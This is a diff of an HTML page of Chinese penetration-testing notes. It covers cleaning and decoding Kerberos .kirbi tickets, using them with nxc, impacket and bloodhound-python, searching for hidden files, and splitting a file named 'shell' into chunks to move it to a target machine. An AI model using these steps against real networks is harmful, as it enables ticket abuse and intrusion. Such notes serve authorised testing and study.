@@ -4023,6 +4068,8 @@ linux换行</p>
 </span></span><span style="display:flex;"><span>tr -d <span style="color:#e6db74">&#39; &#39;</span> &lt; test.kirbi.b64 &gt; cleaned.kirbi.b64
 </span></span><span style="display:flex;"><span>再
 </span></span><span style="display:flex;"><span>tr -d <span style="color:#e6db74">&#39;\r\n&#39;</span> &lt; cleaned.kirbi.b64 &gt; final_ticket.b64
+</span></span></code></pre></div><p>或者</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>dos2unix ed25519
 </span></span></code></pre></div><p>之后bse64解密</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>base64 -d ticket.kirbi.b64 &gt; ticket.kirbi
 </span></span></code></pre></div><p>转换类型</p>
@@ -4037,7 +4084,12 @@ linux换行</p>
 </span></span></code></pre></div><p>递归详细查找隐藏文件</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>gci -recurse -force <span style="color:#f92672">-file</span> &lt;文件夹&gt;
 </span></span></code></pre></div><h2 id="传递文件传文件">传递文件——传文件
-</h2><h3 id="base64传文件">base64传文件
+</h2><h3 id="分块传输">分块传输
+</h3><p>适应文件大小过大无法传输,以下命令是将程序分成100kb一份的程度</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>aplit -b <span style="color:#ae81ff">100</span> shell
+</span></span></code></pre></div><p>传递到目标机器后合并</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>cat shell* &gt; shell
+</span></span></code></pre></div><h3 id="base64传文件">base64传文件
 </h3><h4 id="linux">linux
 </h4><p>先将文件base64</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>base64 -w0 filename
@@ -4232,7 +4284,7 @@ linux换行</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc smb $ip -u $user -p $pass -k --generate-krb5-file krb5.conf
 </span></span></code></pre></div><h3 id="impacket包">impacket包
 </h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>使用的时候只需要导入票据，在原本使用基础上-k -no-pass,或者不使用 -k -no-pass，单纯使用用户名或者密码进行-k参数也能使用，impacket包会自动完成请求tgt并导入的操作
-</span></span></code></pre></div><h3 id="nxc-3">nxc
+</span></span></code></pre></div><h3 id="nxc-4">nxc
 </h3><p>导入票据后，在原有命令加上</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>-k
 </span></span></code></pre></div><h3 id="bloodhound-python-1">bloodhound-python
